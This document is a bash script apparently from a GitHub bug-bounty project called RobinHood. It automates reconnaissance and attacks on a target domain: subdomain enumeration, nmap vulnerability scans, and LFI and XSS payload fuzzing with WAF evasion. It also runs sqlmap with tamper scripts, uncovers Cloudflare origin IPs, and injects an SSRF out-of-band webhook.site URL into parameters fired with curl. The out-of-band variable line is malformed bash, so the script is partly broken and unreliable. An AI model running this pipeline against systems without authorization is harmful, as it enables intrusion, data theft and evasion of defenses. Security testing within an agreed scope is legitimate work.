#!/usr/bin/env bash

## RobinHood - Bug Hunting Recon Automation Script
## https://github.com/CalfCrusher

## Usage: Run in background mod with: nohup ./RobinHood.sh LARGE_SCOPE_DOMAIN OUT_OF_SCOPE_LIST 2>&1 &
## Esample: nohup ./RobinHood.sh example.com vpn.example.com,test.example.com 2>&1 &

# Save starting execution time
start=`date +%s`

echo ''
echo 'RobinHood - Bug Hunting Recon Automation Script (https://github.com/CalfCrusher)'

# Save locations of tools and file
FINGERPRINTS="/root/go/pkg/mod/github.com/haccer/subjack@v0.0.0-20201112041112-49c51e57deab/fingerprints.json" # Path for subjack fingerprints (EDIT THIS)
CLOUDFLAIR="/root/CloudFlair/cloudflair.py" # Path for CloudFlair tool location (EDIT THIS)
CENSYS_API_ID="" # Censys api id for CloudFlair(EDIT THIS)
CENSYS_API_SECRET="" # Censys api secret for CloudFlair (EDIT THIS)
VULSCAN_NMAP_NSE="/root/vulscan/vulscan.nse" # Vulscan NSE script for Nmap (EDIT THIS)
JSUBFINDER_SIGN="/root/.jsf_signatures.yaml" # Path signature location for jsubfinder (EDIT THIS)
LINKFINDER="/root/LinkFinder/linkfinder.py" # Path for LinkFinder tool (EDIT THIS)
VHOSTS_SIEVE="/root/vhosts-sieve/vhosts-sieve.py" # Path for VHosts Sieve tool (EDIT THIS)
CLOUD_ENUM="/root/cloud_enum/cloud_enum.py" # Path for cloud_enum tool, Multi-cloud OSINT tool (EDIT THIS)
SUBLIST3R="/root/Sublist3r/sublist3r.py" # Path for sublist3r tool (EDIT THIS)
ALTDNS_WORDS="/root/altdns/words-medium.txt" # Path to altdns words permutations file (EDIT THIS)
DNSREAPER="/root/dnsReaper/main.py" # Path to dnsrepaer tool (EDIT THIS)
ORALYZER="/root/Oralyzer/oralyzer.py" # Oralyzer path url tool (EDIT THIS)
ORALYZER_PAYLOADS="/root/Oralyzer/payloads.txt" # Oralyzer payloads file (EDIT THIS)
SMUGGLER="/root/smuggler/smuggler.py" # Smuggler tool (EDIT THIS)
PARAMS="/root/params.txt" # List of params for bruteforcing GET/POST hidden params (EDIT THIS)
LFI_PAYLOADS="/root/LFI-Jhaddix.txt" # List of payloads for LFI
XSS_PAYLOADS="/root/xss-payloads-short-list.txt" # List of XSS payloads (EDIT THIS)
PARAMSPIDER="/root/ParamSpider/paramspider.py" # Path to paramspider tool (EDIT THIS)
DIRSEARCH="/root/dirsearch/dirsearch.py" # Path to dirsearch tool (EDIT THIS)
DIRSEARCH_WORDLIST="/root/dirsearch/dirsearch.txt" # Path to dirsearch wordlist (EDIT THIS)
$URL_OUT_OF_BAND="https://webhook.site/c7bbcccf-42d9-4161-9713-a6f458a5a4e9" # Url for out of band interactions (use Burp Collaborator or similar)

SUBFINDER=$(command -v subfinder)
AMASS=$(command -v amass)
HTTPX=$(command -v httpx)
GF=$(command -v gf)
GAU=$(command -v gau)
QSREPLACE=$(command -v qsreplace)
GOWITNESS=$(command -v gowitness)
JSUBFINDER=$(command -v jsubfinder)
NUCLEI=$(command -v nuclei)
NMAP=$(command -v nmap)
SUBJS=$(command -v subjs)
ANEW=$(command -v anew)
DALFOX=$(command -v dalfox)
ALTDNS=$(command -v altdns)
URO=$(command -v uro)
CRLFUZZ=$(command -v crlfuzz)
FFUF=$(command -v ffuf)
SQLMAP=$(command -v sqlmap)

# Get large scope domain as first argument
HOST=$1

# Get list of excluded subdomains as second argument
OUT_OF_SCOPE_SUBDOMAINS=$2

echo ''
echo ''
echo '* Subdomains Enumeration ..'
echo ''
echo ''

# Subdomains Enumeration
python3 $SUBLIST3R -d $HOST -o subdomains_$HOST.txt
$SUBFINDER -d $HOST -silent | awk -F[ ' {print $1}' | tee -a subdomains_$HOST.txt
$AMASS enum -passive -d $HOST | tee -a subdomains_$HOST.txt

echo ''
echo ''
echo '* Adding more subdomains using permutation (AltDNS) ..'
echo ''
echo ''

# Subdomains permutations with altdns
$ALTDNS -i subdomains_$HOST.txt -o temp_output -w $ALTDNS_WORDS -r -s altdns_temp_subdomains_$HOST.txt
cat altdns_temp_subdomains_$HOST.txt | cut -f1 -d":" | tee -a subdomains_$HOST.txt
rm temp_output && rm altdns_temp_subdomains_$HOST.txt

# Remove duplicated subdomains
cat subdomains_$HOST.txt | $QSREPLACE -a | tee subdomains_temp_$HOST.txt
rm subdomains_$HOST.txt
mv subdomains_temp_$HOST.txt subdomains_$HOST.txt

# Exclude out of scope subdomains
if [ ! -z "$OUT_OF_SCOPE_SUBDOMAINS" ]
then
    set -f
    array=(${OUT_OF_SCOPE_SUBDOMAINS//,/ })
    for i in "${!array[@]}"
    do
            subdomain="${array[i]}"
            sed -i "/$subdomain/d" ./subdomains_$HOST.txt
    done
fi

echo ''
echo ''
echo '* Checking live subdomains and status code ..'
echo ''
echo ''

# Check live subdomains and status code
cat subdomains_$HOST.txt | $HTTPX -mc 200,403,404,500,401 -silent | tee live_subdomains_$HOST.txt

echo ''
echo ''
echo '* Run Dirsearch on all live subdomains ..'
echo ''
echo ''

# Run dirsearch on all live subdomains
python3 $DIRSEARCH -l live_subdomains_$HOST.txt -e php,html,aspx -w $DIRSEARCH_WORDLIST -o dirsearch_results.txt --format=plain

echo ''
echo ''
echo '* Fuzzing CRLF vulnerabilities ..'
echo ''
echo ''

# Fuzzing CRLF vulnerabilities
$CRLFUZZ -l live_subdomains_$HOST.txt -o crlfuzz_results_$HOST.txt

# Remove file if empty
if [ ! -s crlfuzz_results_$HOST.txt ]
then
    rm crlfuzz_results_$HOST.txt
fi

echo ''
echo ''
echo '* HTTP Request Smuggling CRLF on all live subdomains ..'
echo ''
echo ''

# Run Smuggler, a HTTP Request Smuggling / Desync testing tool
cat live_subdomains_$HOST.txt | python3 $SMUGGLER --no-color -x -q -l smuggler_results_$HOST.txt

echo ''
echo ''
echo '* Searching for subdomains takeover ..'
echo ''
echo ''

# Search for subdomains takeover with DNS Reaper
if [ ! -z "$DNSREAPER" ]
then
    python3 $DNSREAPER file --filename subdomains_$HOST.txt --out dnsreaper_$HOST --out-format json
fi

# Remove file if empty
if [ ! -s dnsreaper_$HOST.json ]
then
    rm dnsreaper_$HOST.json
fi

echo ''
echo ''
echo '* Running nmap on all subdomains ..'
echo ''
echo ''

# Scan with NMAP and Vulners
if [ ! -z "$VULSCAN_NMAP_NSE" ]
then
    $NMAP -sV -oN nmap_results_$HOST.txt -iL subdomains_$HOST.txt --script=$VULSCAN_NMAP_NSE -F
    sed -i '/Failed to resolve/d' nmap_results_$HOST.txt
fi

echo ''
echo ''
echo '* Running ParamSpider on main domain ..'
echo ''
echo ''

# Run ParamSpider
if [ ! -z "$PARAMSPIDER" ]
then
    # Get params with ParamSpider from domain
    python3 $PARAMSPIDER --domain $HOST --exclude woff,css,js,png,svg,jpg --quiet
    cat output/$HOST.txt | $URO | tee paramspider_results_$HOST.txt
    rm -rf output/
fi

echo ''
echo ''
echo '* Getting screenshots of all live subdomains ..'
echo ''
echo ''

# Get screenshots of subdomains
$GOWITNESS file -f live_subdomains_$HOST.txt -P screenshots_$HOST -t 2 -X 800 -Y 600 --delay 5

echo ''
echo ''
echo '* Searching for vhosts ..'
echo ''
echo ''

# Searching for virtual hosts
python3 $VHOSTS_SIEVE -d subdomains_$HOST.txt -o vhost_$HOST.txt

# Remove file if empty
if [ ! -s vhost_$HOST.txt ]
then
    rm vhost_$HOST.txt
fi

echo ''
echo ''
echo '* Searching for public resources in AWS, Azure, and Google Cloud ..'
echo ''
echo ''

# Searching for public resources in AWS, Azure, and Google Cloud
KEYWORD=$(echo ${HOST} | cut -d"." -f1)
python3 $CLOUD_ENUM -k $HOST -k $KEYWORD -l cloud_enum_$HOST.txt

echo ''
echo ''
echo '* Searching for secrets in javascript files ..'
echo ''
echo ''

# Search for secrets
$JSUBFINDER search -f live_subdomains_$HOST.txt -s jsubfinder_secrets_$HOST.txt

# Remove file if empty
if [ ! -s jsubfinder_secrets_$HOST.txt ]
then
    rm jsubfinder_secrets_$HOST.txt
fi

echo ''
echo ''
echo '* Getting all urls using Gau ..'
echo ''
echo ''

# Get URLs with gau
cat live_subdomains_$HOST.txt | $GAU --blacklist png,jpg,gif,jpeg,swf,woff,svg,pdf,tiff,tif,bmp,webp,ico,mp4,mov,js,css,eps,raw | tee all_urls_$HOST.txt

echo ''
echo ''
echo '* Decrease number of urls and save only those with 200 status code ..'
echo ''
echo ''

# Decrease numbers of URLs using URO and check live urls using httpx
cat all_urls_$HOST.txt | $URO | $HTTPX -mc 200 -silent | tee live_urls_$HOST.txt

echo ''
echo ''
echo '* Grep endpoints with params ..'
echo ''
echo ''

# Get endpoints that have parameters
cat live_urls_$HOST.txt | grep '?' | tee params_endpoints_urls_$HOST.txt

# Remove file if empty
if [ ! -s params_endpoints_urls_$HOST.txt ]
then
    rm params_endpoints_urls_$HOST.txt
fi

echo ''
echo ''
echo '* Grep PHP endpoints without params ..'
echo ''
echo ''

# Get php endpoints
cat live_urls_$HOST.txt | grep ".php" | cut -f1 -d"?" | sed 's:/*$::' | sort -u > php_endpoints_urls_$HOST.txt

echo ''
echo ''
echo '* Fuzzing php endpoints for possible hidden params ..'
echo ''
echo ''

# Remove file if empty, if not run ffuf
if [ ! -s php_endpoints_urls_$HOST.txt ]
then
    rm php_endpoints_urls_$HOST.txt
else
    # Save in a folder possibile hidden params to check for sql injections later
    if [ ! -z "$PARAMS" ]
    then
        # GET
        for URL in $(<php_endpoints_urls_$HOST.txt); do ($FFUF -u "${URL}?FUZZ=1" -w $PARAMS -mc 200 -ac -sa -t 20 -or -od ffuf_hidden_params_results); done

        # POST
        for URL in $(<php_endpoints_urls_$HOST.txt); do ($FFUF -X POST -u "${URL}" -w $PARAMS -mc 200 -ac -sa -t 20 -or -od ffuf_hidden_params_results -d "FUZZ=1"); done
    fi
fi

echo ''
echo ''
echo '* Getting JS urls ..'
echo ''
echo ''

# Extracts js urls
cat live_urls_$HOST.txt | $SUBJS | sort -u > javascript_urls_$HOST.txt

# Remove third-part domains from js file urls
awk "/${HOST}/" javascript_urls_$HOST.txt > javascript_urls_temp_$HOST.txt
rm javascript_urls_$HOST.txt
mv javascript_urls_temp_$HOST.txt javascript_urls_$HOST.txt

echo ''
echo ''
echo '* Discovering endpoints in JS urls ..'
echo ''
echo ''

# Discover endpoints in javascript urls
if [ ! -z "$LINKFINDER" ]
then
    while IFS='' read -r URL || [ -n "${URL}" ]; do
        echo -e "[URL] -> ${URL}" >> linkfinder_results_$HOST.txt
        python3 $LINKFINDER -i $URL -o cli | tee -a linkfinder_results_$HOST.txt
        echo -e "\n\n\n" >> linkfinder_results_$HOST.txt
    done < javascript_urls_$HOST.txt
fi

echo ''
echo ''
echo '* Running Nuclei on all live subdomains ..'
echo ''
echo ''

# Run Nuclei
$NUCLEI -list live_subdomains_$HOST.txt -o nuclei_results_$HOST.txt -c 2

echo ''
echo ''
echo '* Extract possible cloudflare hosts and try to get origin ip ..'
echo ''
echo ''

# Extract cloudflare protected hosts from nuclei output
cat nuclei_results_$HOST.txt | grep ":cloudflare" | awk '{print $(NF)}' | sed -E 's/^\s*.*:\/\///g' | sed 's/\///'g | sort -u > cloudflare_hosts_$HOST.txt

# Remove file if empty, if not run cloudflair tool
if [ ! -s cloudflare_hosts_$HOST.txt ]
then
    rm cloudflare_hosts_$HOST.txt
else
    # Try to get origin ip using SSL certificate (cloudflair and censys)
    if [ ! -z "$CENSYS_API_ID" ]
    then
        while IFS='' read -r DOMAIN || [ -n "${DOMAIN}" ]; do
            python3 $CLOUDFLAIR $DOMAIN --censys-api-id $CENSYS_API_ID --censys-api-secret $CENSYS_API_SECRET | tee -a origin_$HOST.txt
            sleep 45
        done < cloudflare_hosts_$HOST.txt
    fi
fi

echo ''
echo ''
echo '* Search path traversal vuln on ParamSpider results using FFUF ..'
echo ''
echo ''

# Search of LFI
if [ ! -s paramspider_results_$HOST.txt ]
then
    rm paramspider_results_$HOST.txt
else
    for URL in $(<paramspider_results_$HOST.txt); do ($FFUF -u "${URL}" -c -w $LFI_PAYLOADS -mc 200 -ac -sa -t 20 -or -od ffuf_lfi_results); done
fi

echo ''
echo ''
echo '* Extracting urls with SSRF params and try out-of-band interactions ..'
echo ''
echo ''

# Extract urls with possible SSRF params
cat params_endpoints_urls_$HOST.txt | $GF ssrf > ssrf_urls_$HOST.txt

# Remove file if empty
if [ ! -s ssrf_urls_$HOST.txt ]
then
    rm ssrf_urls_$HOST.txt
else
    cat ssrf_urls_$HOST.txt | grep "=" | $QSREPLACE $URL_OUT_OF_BAND | xargs curl -ks
fi

echo ''
echo ''
echo '* Extracting urls with possible XSS params and run Dalfox ..'
echo ''
echo ''

# Extract urls with possible XSS params
cat params_endpoints_urls_$HOST.txt | $GF xss > xss_urls_$HOST.txt

# Remove file if empty, if not run dalfox tool
if [ ! -s xss_urls_$HOST.txt ]
then
    rm xss_urls_$HOST.txt
else
    # Running Dalfox
    $DALFOX file xss_urls_$HOST.txt -o dalfox_PoC_$HOST.txt --custom-payload $XSS_PAYLOADS --only-custom-payload --waf-evasion -w 20
fi    

echo ''
echo ''
echo '* Extracting urls with possible SQL params and run sqlmap ..'
echo ''
echo ''

# Extract urls with possible SQLi params
cat params_endpoints_urls_$HOST.txt | $GF sqli > sqli_urls_$HOST.txt

# Remove file if empty
if [ ! -s sqli_urls_$HOST.txt ]
then
    rm sqli_urls_$HOST.txt
else
    $SQLMAP -m sqli_urls_$HOST.txt --tamper="between,randomcase" --delay=2 --threads=2 --smart --batch --random-agent --output-dir=sqlmap_$HOST
fi

echo ''
echo ''
echo '* Extracting urls with possible OPEN Redirect params and run Oralyzer ..'
echo ''
echo ''

# Extract urls with possible OPEN REDIRECT params
cat params_endpoints_urls_$HOST.txt | $GF redirect > redirect_urls_$HOST.txt

# Remove file if empty
if [ ! -s redirect_urls_$HOST.txt ]
then
    rm redirect_urls_$HOST.txt
else
    # Run Oralyzer
    if [ ! -z "$ORALYZER" ]
    then
        python3 $ORALYZER -l redirect_urls_$HOST.txt -p $ORALYZER_PAYLOADS > oralyzer_results_$HOST.txt
    fi
fi

# Save finish execution time
end=`date +%s`
echo ''
echo ''
echo ''
echo "********* COMPLETED ! *********"
echo ''
echo "Fork it on https://github.com/CalfCrusher/RobinHood and make World a better place"
echo ''
echo Execution time was `expr $end - $start` seconds
